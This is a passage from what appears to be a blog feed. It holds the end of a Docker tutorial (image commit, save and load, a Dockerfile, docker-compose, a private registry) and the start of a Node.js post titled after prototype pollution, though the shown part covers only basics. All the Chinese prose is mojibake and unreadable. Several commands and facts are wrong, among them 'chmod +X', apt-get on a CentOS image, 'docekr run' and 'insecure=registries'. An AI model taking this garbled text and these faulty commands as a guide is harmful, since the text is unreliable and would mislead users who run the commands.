src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210408211917032.png"></p><p>å¯¹äºä½¿ç”¨è€…æ¥è¯´ å°±æ˜¯é›†æˆäº†æ“ä½œç³»ç»Ÿå’Œç¼–è¯‘è¿è¡Œç¯å¢ƒçš„æ–‡ä»¶ç³»ç»Ÿ</p><h2 id="å…«ã€å‹ç¼©æ–‡ä»¶"><a href="#å…«ã€å‹ç¼©æ–‡ä»¶" class="headerlink" title="å…«ã€å‹ç¼©æ–‡ä»¶"></a>å…«ã€å‹ç¼©æ–‡ä»¶</h2><p>ç±»ä¼¼äºæ“ä½œç³»ç»Ÿä¸­ Ghost æŠŠåˆ†åŒºå…‹éš†ä¸º.gho æ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210418172617431.png"></p><ol><li>å®¹å™¨è½¬ä¸ºé•œåƒ</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker commit å®¹å™¨<span class="hljs-built_in">id</span> é•œåƒå:ç‰ˆæœ¬å·<br></code></pre></td></tr></table></figure><p>2.å‹ç¼©é•œåƒ</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">docker <span class="hljs-keyword">save</span> -o å‹ç¼©æ–‡ä»¶å é•œåƒå:ç‰ˆæœ¬å·<br></code></pre></td></tr></table></figure><p>3.è§£å‹å‡ºé•œåƒ</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker load -<span class="hljs-selector-tag">i</span> å‹ç¼©æ–‡ä»¶å<br></code></pre></td></tr></table></figure><h2 id="ä¹ã€Dockerfile"><a href="#ä¹ã€Dockerfile" class="headerlink" title="ä¹ã€Dockerfile"></a>ä¹ã€Dockerfile</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210418172524845.png"></p><p>å®ƒæ˜¯ä¸€ä¸ªè®°å½•æŒ‡ä»¤çš„æ–‡æœ¬æ–‡ä»¶ æ¯ä¸€æ¡æŒ‡ä»¤æ„é€ ä¸€å±‚åŸºç¡€é•œåƒ(å¼€å‘) æœ€ç»ˆæ„é€ æˆä¸€ä¸ªå®Œæ•´çš„å‘å¸ƒé•œåƒ è¿™ç§åšæ³•å’Œå®¹å™¨æ‰“åŒ…ä¸ºå‹ç¼©æ–‡ä»¶ä¸ä¸€æ · ä½†æœ€ç»ˆæ•ˆæœä¸€è‡´ éƒ½èƒ½ä¸ºå¼€å‘äººå‘˜æä¾›ä¸€ä¸ªå®Œå…¨ä¸€è‡´çš„å¼€å‘ç¯å¢ƒ æœ‰åˆ©äºå¤šæ–¹è°ƒè¯• å¯¹äºæµ‹è¯•äººå‘˜åˆ™ç›´æ¥å¯ä»¥æŠŠå…¶ docker run ç„¶åç”¨äºå·¥ä½œ å¯¹äºè¿ç»´äººå‘˜åˆ™å¯ä»¥åœ¨åº”ç”¨éƒ¨ç½²æ—¶å®ç°æ— ç¼è¡”æ¥</p><p>æ®æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªè½¯ä»¶(æ“ä½œç³»ç»Ÿ)å®‰è£…åå°±æœ‰å“ªäº›åŠŸèƒ½(å¤¹å¸¦å“ªäº›è½¯ä»¶) FROM MAITAINER RUN WORKDIR</p><h3 id="ç¼–å†™-Dockerfile"><a href="#ç¼–å†™-Dockerfile" class="headerlink" title="ç¼–å†™ Dockerfile"></a>ç¼–å†™ Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#æ¡ˆä¾‹ åˆšå®‰è£…çš„centosç»ˆç«¯è¾“å…¥vimå‘ç°ä¸èƒ½ä½¿ç”¨ è¯´æ˜vimå¹¶æ²¡æœ‰è¢«è½½å…¥centosçš„é•œåƒä¸­ éœ€è¦ç”¨æˆ·è‡ªè¡Œå®‰è£… é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰é•œåƒ</span><br><br>â‘ å®šä¹‰çˆ¶é•œåƒ <span class="hljs-keyword">FROM</span> centos7<br>â‘¡å®šä¹‰ä½œè€…ä¿¡æ¯ <span class="hljs-keyword">MAINTAINER</span> wo02ie<br>â‘¢æ‰§è¡Œå®‰è£…è½¯ä»¶çš„å‘½ä»¤ <span class="hljs-keyword">RUN</span><span class="bash"> apt-get install vim</span><br><span class="hljs-comment">#è¿˜å¯ä½¿ç”¨ç¦»çº¿å®‰è£…åŒ… ADD springboot.jar app.jar</span><br><span class="hljs-comment">#CMD jar -jar app.jar</span><br><br>â‘£å®šä¹‰é»˜è®¤å·¥ä½œç›®å½• <span class="hljs-keyword">WORKDIR</span><span class="bash">ã€€ï¼ï½•ï½“ï½’</span><br>â‘¤è®©å®¹å™¨å¯åŠ¨æ‰§è¡Œå‘½ä»¤ã€€<span class="hljs-keyword">CMD</span><span class="bash">ã€€ï¼ˆå¸¸æ˜¯ï¼‰ï¼ï½‚ï½‰ï½ï¼ï½‚ï½ï½“ï½ˆ</span><br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨-Dockerfile-æ–‡ä»¶"><a href="#ä½¿ç”¨-Dockerfile-æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ Dockerfile æ–‡ä»¶"></a>ä½¿ç”¨ Dockerfile æ–‡ä»¶</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker build -f ..<span class="hljs-regexp">/./</span>Dockerfile -t é•œåƒå . <span class="hljs-comment">#è¿™ä¸ªç‚¹ä¸èƒ½çœç•¥ å°†æ¥å·¥ä½œå¯»å€ç”¨</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ dockerfile æ—¶ image é‡Œæ²¡æœ‰ vim ä½†è¦æ¢ apt-get æº</p><p>åœ¨/etc/apt/</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">echo <span class="hljs-string">&quot;&quot;</span>&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br>echo <span class="hljs-string">&quot;deb http://mirrors.163.com/ubuntu/ artful-security main restricted universe multiverse&quot;</span>&gt;&gt;sources<span class="hljs-meta">.list</span><br><br><span class="hljs-meta">#è¿™é‡Œä¸æ”¾å…¶ä»–çš„ éƒ½æ˜¯ç½‘ä¸Šæ‰¾çš„ æ¯”è¾ƒè€çš„æº å¤±æ•ˆå±…å¤š è‡ªå·±å†å»æ‰¾å…¶ä»–çš„æºç”¨å§</span><br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢è¿™ç§æ–¹æ³• è¿˜æœ‰æ²¡æœ‰å…¶ä»–æ›´ç®€æ´çš„æ–¹æ³•å‘¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;è¦ä¿®æ”¹çš„æ–‡ä»¶ æ¯”å¦‚sources.list<br>cat &lt;&lt; <span class="hljs-string">EOF &gt; sources.list</span><br><span class="hljs-string">ç„¶åå°±å¯ä»¥è¾“å…¥ä»»ä½•ä¸œè¥¿ è¿˜å¯ä»¥ç¼–è¾‘</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span>å›è½¦ç»“æŸ<br></code></pre></td></tr></table></figure><h2 id="åã€æœåŠ¡ç¼–æ’"><a href="#åã€æœåŠ¡ç¼–æ’" class="headerlink" title="åã€æœåŠ¡ç¼–æ’"></a>åã€æœåŠ¡ç¼–æ’</h2><p>å¤§é‡æœåŠ¡éœ€è¦æŒ‰ç…§ä¸€å®šé¡ºåºå¯åŠ¨ å¯¹æœåŠ¡è¿›è¡Œæ‰¹é‡ç®¡ç† å°±éœ€è¦ä½¿ç”¨æœåŠ¡ç¼–æ’</p><p>æ­¥éª¤å¦‚ä¸‹</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>ã€åŒæ · åˆ›å»ºDockerfileå®šä¹‰å¥½æœåŠ¡ç¯å¢ƒ<br><span class="hljs-number">2</span>ã€ä½¿ç”¨docker-compose.ymlå®šä¹‰ç»„æˆçš„å„ä¸ªæœåŠ¡<br><span class="hljs-number">3</span>ã€ä½¿ç”¨å‘½ä»¤docker-compose <span class="hljs-keyword">up</span>å¯åŠ¨åº”ç”¨<br></code></pre></td></tr></table></figure><ul><li>docker compose å®‰è£…</li></ul><p>github ä¸Šé¢çš„ docker/compose/release æ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬</p><p>ä½¿ç”¨ curl -L <a href="https://github.com/docker/compose/release/download/xxx/docker-compose-">https://github.com/docker/compose/release/download/xxx/docker-compose-</a> `uname -s`-`uname -m` -o /usr/local/bin/docker-compose</p><p>chmod +X /usr/local/bin/docker-compose</p><p>docker-compose -version</p><ul><li><p>docker compose ä½¿ç”¨<br>è¿›å…¥ docekr-compose æ–‡ä»¶ä¸‹ ç¼–è¾‘ä¸€ä¸ª vim docker-compose.yml<br>ç¼–è¾‘æœåŠ¡çš„ä¸€äº›é…ç½®æœåŠ¡<br><del>è¿ç»´æ“ä½œ</del></p></li><li><p>å¯åŠ¨ä¸€ä¸²æœåŠ¡<br>docker-compose up</p></li></ul><h2 id="åä¸€ã€Docker-ç§æœ‰ä»“åº“"><a href="#åä¸€ã€Docker-ç§æœ‰ä»“åº“" class="headerlink" title="åä¸€ã€Docker ç§æœ‰ä»“åº“"></a>åä¸€ã€Docker ç§æœ‰ä»“åº“</h2><p>ç±»ä¼¼äº Github ä½†è¿™ä¸»è¦ç”¨æ¥ä¿å­˜é•œåƒ</p><p><strong>æ­å»ºæ­¥éª¤ï¼š</strong></p><ul><li><p>æ‹‰å»ç§æœ‰ä»“åº“<br>docker pull registry</p></li><li><p>å¯åŠ¨ç§æœ‰ä»“åº“<br>docekr run -id â€“name=registry -p 5000:5000 registry</p></li><li><p>è®¿é—®ç§æœ‰ä»“åº“<br>http://æœ¬åœ°ç§æœ‰ä»“åº“ip:5000/v2/_catalog</p></li></ul><p>è®¿é—®åˆ°ä¸€ä¸ª json å­—ç¬¦ä¸² è¯´æ˜æ­å»ºæˆåŠŸ</p><ul><li>ç¼–è¾‘åŠ é€Ÿå™¨æ–‡ä»¶<br>å°†ç§æœ‰ä»“åº“æ·»åŠ åˆ°åŠ é€Ÿå™¨ vim /etc/docker/daemon.json</li></ul><p>è¿½åŠ ï¼šâ€insecure=registriesâ€:[â€œæœ¬åœ°ä»“åº“åœ°å€:5000â€]</p><ul><li>é‡å¯ docker æœåŠ¡<br>systemctl restart docker</li></ul><p><strong>ä¸Šä¼ é•œåƒåˆ°ç§æœ‰ä»“åº“ï¼š</strong></p><ul><li><p>æ·»åŠ æ ‡è®°ï¼š<br>docker tag æœ¬åœ°é•œåƒå æœ¬åœ°ç§æœ‰ä»“åº“ ip:5000/é•œåƒå</p></li><li><p>å¯åŠ¨ registry å®¹å™¨<br>docker start registry</p></li><li><p>ä¸Šä¼ <br>docker push æœ¬åœ°ç§æœ‰ä»“åº“/é•œåƒå</p></li><li><p>ä»ç§æœ‰ä»“åº“æ‹‰å–é•œåƒ<br>docker pull æœ¬åœ°ç§æœ‰ä»“åº“ ip:5000/é•œåƒå</p></li></ul><h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><p>docker å®¹å™¨è™šæ‹ŸåŒ–ä¸ä¼ ç»Ÿè™šæ‹Ÿæœºæ¯”è¾ƒ</p><p>å°†è½¯ä»¶å’Œè½¯ä»¶è¿è¡Œç¯å¢ƒè¿›è¡Œæ‰“åŒ… ä¾¿äºå¼€å‘äº¤ä»˜éƒ¨ç½²</p><p>å®¹å™¨è™šæ‹ŸåŒ–çš„æ˜¯æ“ä½œç³»ç»Ÿ/è½¯ä»¶ è™šæ‹Ÿæœºè™šæ‹ŸæœºåŒ–çš„æ˜¯ç¡¬ä»¶</p><p>è™šæ‹Ÿæœºå¯ä»¥è¿è¡Œä¸åŒçš„æ“ä½œç³»ç»Ÿ å®¹å™¨åªèƒ½å¯„ç”Ÿäºä¸€ä¸ªæ“ä½œç³»ç»Ÿ</p><p><del>è™šæ‹Ÿæœºå·²æ­» å®¹å™¨æ‰æ˜¯æœªæ¥</del></p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs&amp;åŸå‹é“¾æ±¡æŸ“</title>
    <link href="/2021/04/27/nodejs&amp;Prototype-Pollution-Attack/"/>
    <url>/2021/04/27/nodejs&amp;Prototype-Pollution-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>ï¼š</p><ul><li><code>ECMAScript</code>(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)</li><li><code>DOM</code>ï¼ˆä¸€äº›æ“ä½œé¡µé¢å…ƒç´ çš„æ–¹æ³•ï¼‰</li><li><code>BOM</code>ï¼ˆä¸€äº›æ“ä½œæµè§ˆå™¨çš„æ–¹æ³•ï¼‰</li></ul><p>ä¸Šé¢æ˜¯<code>JavaScript</code>çš„ç»„æˆéƒ¨åˆ†ï¼Œé‚£ä¹ˆ<code>Nodejs</code>å‘¢ï¼Ÿ</p><p><strong>Nodejs</strong>ï¼š</p><ul><li><code>ECMAScript</code>(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)</li><li><code>os</code>(æ“ä½œç³»ç»Ÿ)</li><li><code>file</code>(æ–‡ä»¶ç³»ç»Ÿ)</li><li><code>net</code>(ç½‘ç»œç³»ç»Ÿ)</li><li><code>database</code>(æ•°æ®åº“)</li></ul><p>ç®€å•çš„è¯´ Node.js å°±æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ JavaScriptã€‚</p><p>Node.js æ˜¯ä¸€ä¸ªåŸºäº Chrome JavaScript è¿è¡Œæ—¶å»ºç«‹çš„ä¸€ä¸ªå¹³å°ã€‚</p><p>Node.js æ˜¯ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ I/O æœåŠ¡ç«¯ JavaScript ç¯å¢ƒï¼ŒåŸºäº Google çš„ V8 å¼•æ“ï¼ŒV8 å¼•æ“æ‰§è¡Œ Javascript çš„é€Ÿåº¦éå¸¸å¿«ï¼Œæ€§èƒ½éå¸¸å¥½ã€‚</p><p>å®‰è£…ã€ç¯å¢ƒé…ç½®ç•¥</p><h2 id="ä¸€ã€è¿è¡Œè„šæœ¬"><a href="#ä¸€ã€è¿è¡Œè„šæœ¬" class="headerlink" title="ä¸€ã€è¿è¡Œè„šæœ¬"></a>ä¸€ã€è¿è¡Œè„šæœ¬</h2><p>ï¼ˆ ç•¥ï¼‰<br>ç›®çš„ï¼šç¼–å†™ç®€å•çš„ä¸€ä¸ªè„šæœ¬å¹¶è¿è¡Œ äº†è§£ nodejs</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hello world!&quot;</span>) <span class="hljs-meta">#ä¿å­˜ä¸ºhelloworld.jsæ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>ç»ˆç«¯åˆ°æ­¤ç›®å½•ï¼Œ<code>node helloworld.js</code></p><p>æŸ¥æ‰¾å‘½ä»¤ node -h</p><h2 id="äºŒã€web-æœåŠ¡å™¨"><a href="#äºŒã€web-æœåŠ¡å™¨" class="headerlink" title="äºŒã€web æœåŠ¡å™¨"></a>äºŒã€web æœåŠ¡å™¨</h2><p>ä½¿ç”¨ php ç¼–å†™åç«¯ä»£ç å éƒ¨ç½²éœ€è¦ Apache æˆ– Nginx å¹¶ä¸”è¦æœ‰ mod_php å’Œ php_cgi æ‰èƒ½æˆåŠŸè§£æ php</p><p>nodejs ä¸ä»…èƒ½å……å½“ä¸Šè¿°æœåŠ¡å™¨çš„ä½œç”¨ è¿˜èƒ½å®ç°ä¸€ä¸ªåº”ç”¨</p><p>å°±ä¸Šä¾‹è€Œè¨€ nodejs çš„åº”ç”¨ç”± http æ¨¡å—ã€æœåŠ¡å™¨ã€å¤„ç†è¯·æ±‚å’Œå‘é€å“åº”</p><h3 id="â‘ -å¼•å…¥æ¨¡å—"><a href="#â‘ -å¼•å…¥æ¨¡å—" class="headerlink" title="â‘  å¼•å…¥æ¨¡å—"></a>â‘  å¼•å…¥æ¨¡å—</h3><p>ä½¿ç”¨ require è½½å…¥ http æ¨¡å— æŠŠå®ä¾‹åŒ–çš„ HTTP æœåŠ¡èµ‹å€¼ç»™å˜é‡ http å…¶ä¸­ require æ˜¯ nodejs è‡ªå¸¦çš„ http æ¨¡å—<br><code>var http = require(&quot;http&quot;);</code></p><h3 id="â‘¡-åˆ›å»ºæœåŠ¡å™¨"><a href="#â‘¡-åˆ›å»ºæœåŠ¡å™¨" class="headerlink" title="â‘¡ åˆ›å»ºæœåŠ¡å™¨"></a>â‘¡ åˆ›å»ºæœåŠ¡å™¨</h3><p>åœ¨ http æ¨¡å—ä¸­æä¾›ä¸€å‡½æ•° creatServerï¼Œå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ å¯ä»¥é€šè¿‡ listen çš„æ–¹æ³•æˆªè·</p><p>http.creatServe()æ–¹æ³•åˆ›å»ºæœåŠ¡å™¨ listen 8080<br>åœ¨é‡Œé¢ä½¿ç”¨ request å’Œ response æ¥æ¥æ”¶å’Œå“åº”</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//httpserver.js</span><br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">request,response</span>)</span>&#123;<br>    response.writeHead(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<span class="hljs-comment">//httpå¤´ çŠ¶æ€ç  å†…å®¹ç±»å‹</span><br>    response.end(<span class="hljs-string">&quot;The js had been called!\n&quot;</span>)<br>&#125;).listen(<span class="hljs-number">8080</span>)<span class="hljs-comment">//ç›‘å¬8080ç«¯å£</span><br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)<br></code></pre></td></tr></table></figure><p>é…åˆ index.html</p><h2 id="ä¸‰ã€npm"><a href="#ä¸‰ã€npm" class="headerlink" title="ä¸‰ã€npm"></a>ä¸‰ã€npm</h2><p>npm æ˜¯ nodejs çš„åŒ…ç®¡ç†å·¥å…· æ–°ç‰ˆçš„ nodejs å·²ç»å¸¦æœ‰ npm<br>ä½†é€šå¸¸è¦å‡çº§<code>npm install npm -g(å…¨å±€å®‰è£…)</code><br>ä¹Ÿéœ€è¦é…ç½®é•œåƒ<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>å®‰è£…æ¨¡å—åˆ†ä¸ºæœ¬åœ°å®‰è£…å’Œå…¨å±€å®‰è£…</p><ul><li><p>æœ¬åœ°å®‰è£…</p><ol><li>å°†å®‰è£…åŒ…æ”¾åœ¨ ./node_modules ä¸‹ï¼ˆè¿è¡Œ npm å‘½ä»¤æ—¶æ‰€åœ¨çš„ç›®å½•ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ node_modules ç›®å½•ï¼Œä¼šåœ¨å½“å‰æ‰§è¡Œ npm å‘½ä»¤çš„ç›®å½•ä¸‹ç”Ÿæˆ node_modules ç›®å½•ã€‚</li><li>å¯ä»¥é€šè¿‡ require() æ¥å¼•å…¥æœ¬åœ°å®‰è£…çš„åŒ…ã€‚</li></ol></li><li><p>å…¨å±€å®‰è£…</p><ol><li>å°†å®‰è£…åŒ…æ”¾åœ¨ /usr/local ä¸‹æˆ–è€…ä½  node çš„å®‰è£…ç›®å½•ã€‚</li><li>å¯ä»¥ç›´æ¥åœ¨å‘½ä»¤è¡Œé‡Œä½¿ç”¨ã€‚</li></ol></li></ul><p>å¸è½½<code>npm uninstall npm</code><br>å‡çº§<code>npm update npm</code><br>æŸ¥çœ‹å®‰è£…ä¿¡æ¯<code>npm list -g</code><br>æœç´¢æ¨¡å—<code>npm search npm</code></p><h3 id="åˆ›å»ºæ¨¡å—"><a href="#åˆ›å»ºæ¨¡å—" class="headerlink" title="åˆ›å»ºæ¨¡å—"></a>åˆ›å»ºæ¨¡å—</h3><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸ªåŒ…çš„ json ä½äº node_modules/npm çš„ package.json<br>å¯ä»¥çœ‹åˆ°æœ‰</p><pre><code>name - åŒ…åã€‚version - åŒ…çš„ç‰ˆæœ¬å·ã€‚description - åŒ…çš„æè¿°ã€‚homepage - åŒ…çš„å®˜ç½‘ url ã€‚author - åŒ…çš„ä½œè€…å§“åã€‚contributors - åŒ…çš„å…¶ä»–è´¡çŒ®è€…å§“åã€‚dependencies - ä¾èµ–åŒ…åˆ—è¡¨ã€‚å¦‚æœä¾èµ–åŒ…æ²¡æœ‰å®‰è£…ï¼Œnpm ä¼šè‡ªåŠ¨å°†ä¾èµ–åŒ…å®‰è£…åœ¨ node_module ç›®å½•ä¸‹ã€‚repository - åŒ…ä»£ç å­˜æ”¾çš„åœ°æ–¹çš„ç±»å‹ï¼Œå¯ä»¥æ˜¯ git æˆ– svnï¼Œgit å¯åœ¨ Github ä¸Šã€‚main - main å­—æ®µæŒ‡å®šäº†ç¨‹åºçš„ä¸»å…¥å£æ–‡ä»¶ï¼Œrequire(&#39;moduleName&#39;) å°±ä¼šåŠ è½½è¿™ä¸ªæ–‡ä»¶ã€‚è¿™ä¸ªå­—æ®µçš„é»˜è®¤å€¼æ˜¯æ¨¡å—æ ¹ç›®å½•ä¸‹é¢çš„ index.jsã€‚keywords - å…³é”®å­—</code></pre><p>npm init(ç›®å½•ä¸‹æ—  package.json å¦åˆ™ä¼šä¿®æ”¹å½“å‰çš„ package.json æ–‡ä»¶)<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/npminit.png"></p><p>æ¥ç€ä½¿ç”¨ npm æ¥å‘å¸ƒæ¨¡å—(ä¸æ¼”ç¤º)</p><ul><li><input checked="" disabled="" type="checkbox"> é¦–å…ˆåœ¨ npm èµ„æºåº“æ³¨å†Œç”¨æˆ·<code>npm adduser</code></li><li><input checked="" disabled="" type="checkbox"> å‘å¸ƒ<code>npm publish</code></li></ul><h2 id="å››ã€REPL-nodejs-è§£é‡Šå™¨"><a href="#å››ã€REPL-nodejs-è§£é‡Šå™¨" class="headerlink" title="å››ã€REPL nodejs è§£é‡Šå™¨"></a>å››ã€REPL nodejs è§£é‡Šå™¨</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/PERl.png"><br>æŸ¥çœ‹ REPL å‘½ä»¤ <code>.help</code></p><p>å¯ä»¥ä¸å£°æ˜å˜é‡ ä½†ä¼šç›´æ¥è¾“å‡º<br>_ä¸‹åˆ’çº¿å¯ä»¥æˆªå–ä¸Šä¸€è¡¨è¾¾å¼çš„è¿ç®—ç»“æœ<br>å¯ä»¥é”®å…¥å˜é‡åè¾“å‡ºå€¼ ä¹Ÿèƒ½ä½¿ç”¨ console.log å‡½æ•°<br>node ä¸­ ctrl+c ä¸€æ¬¡é€€å‡ºå½“å‰ ä¸¤æ¬¡é€€å‡ºè§£é‡Šå™¨ ctrl+d ç›´æ¥é€€å‡ºè§£é‡Šå™¨</p><h2 id="äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯"><a href="#äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯" class="headerlink" title="äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯"></a>äº”ã€å›è°ƒå‡½æ•°ä¸äº‹ä»¶å¾ªç¯</h2><h3 id="å›è°ƒ"><a href="#å›è°ƒ" class="headerlink" title="å›è°ƒ"></a>å›è°ƒ</h3><p>å…ˆæ¥çœ‹ä¸¤ä¸ªä¾‹å­</p><ul><li>é˜»å¡ 1.js</li></ul><p><code>var data = fs.readFileSync(&#39;input.txt&#39;);</code></p><p>è¯»å–å®Œæ–‡ä»¶ æ‰§è¡Œç¨‹åº</p><ul><li>éé˜»å¡ 2.js</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) return console.error(err);<br>    console.log(data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>è¯»å–æ–‡ä»¶çš„åŒæ—¶æ‰§è¡Œåé¢çš„ä»£ç  å› æ­¤æé«˜äº†ç¨‹åºçš„æ€§èƒ½ ä»è€Œæˆ‘ä»¬å¯ä»¥æŠŠéœ€è¦å¤„ç†å›è°ƒå‡½æ•°çš„å‚æ•°å†™åœ¨å›è°ƒå‡½æ•°å†…</p><p>å³ <strong>é˜»å¡æ˜¯æŒ‰é¡ºåºæ‰§è¡Œä»£ç çš„ éé˜»å¡å¯ä»¥ä¸æŒ‰ç…§é¡ºåºæ‰§è¡Œ</strong></p><h3 id="äº‹ä»¶å¾ªç¯"><a href="#äº‹ä»¶å¾ªç¯" class="headerlink" title="äº‹ä»¶å¾ªç¯"></a>äº‹ä»¶å¾ªç¯</h3><p>Node.js å¼‚æ­¥ç¼–ç¨‹çš„ç›´æ¥ä½“ç°å°±æ˜¯å›è°ƒã€‚</p><p>å¼‚æ­¥ç¼–ç¨‹ä¾æ‰˜äºå›è°ƒæ¥å®ç° ä½†ä¸èƒ½è¯´ä½¿ç”¨äº†å›è°ƒåç¨‹åºå°±å¼‚æ­¥åŒ–äº†</p><p>nodejs æ˜¯å•çº¿ç¨‹åº”ç”¨ç¨‹åº è€Œ V8 å¼•æ“æä¾›çš„å¼‚æ­¥æ‰§è¡Œå›è°ƒæ¥å£å°±å¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘ ä»è€Œæå¤§çš„æå‡äº†æ€§èƒ½</p><p>nodejs çš„å‡ ä¹æ¯ä¸ª API æ¥å£éƒ½æ”¯æŒå›è°ƒå‡½æ•° æ‰€æœ‰äº‹ä»¶å‡æ˜¯ä¸Šå¸è§†è§’ å½“äº‹ä»¶è¢«æ£€æµ‹åˆ°å°±ä¼šè§¦å‘å›è°ƒå‡½æ•°<br>Node.js ä½¿ç”¨äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œwebserver ä¸€ç›´æ¥æ”¶è¯·æ±‚è€Œä¸ç­‰å¾…è¯»å†™æ“ä½œï¼ˆéé˜»å¡å¼ IO æˆ–äº‹ä»¶é©±åŠ¨ IOï¼‰ ç„¶åå»æœåŠ¡ä¸‹ä¸€ä¸ª web è¯·æ±‚ å½“è¿™ä¸ªè¯·æ±‚å®Œæˆ å®ƒè¢«æ”¾å›å¤„ç†é˜Ÿåˆ— å½“åˆ°è¾¾é˜Ÿåˆ—å¼€å¤´ è¿™ä¸ªç»“æœè¢«è¿”å›ç»™ç”¨æˆ· è¿™ç§æ¨¡å‹éå¸¸é«˜æ•ˆå¯æ‰©å±•æ€§ä¹Ÿéå¸¸å¼º<br><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/event_loop.jpg"></p><p>å›åˆ°å¼€å¤´çš„å¼•è¨€ æˆ‘ä»¬äº†è§£äº†å›è°ƒå‡½æ•°ä»¥åŠäº‹ä»¶å¾ªç¯ å°±èƒ½æ‰§è¡Œå¼‚æ­¥æ“ä½œäº†<br>ä¸‹é¢æ˜¯ 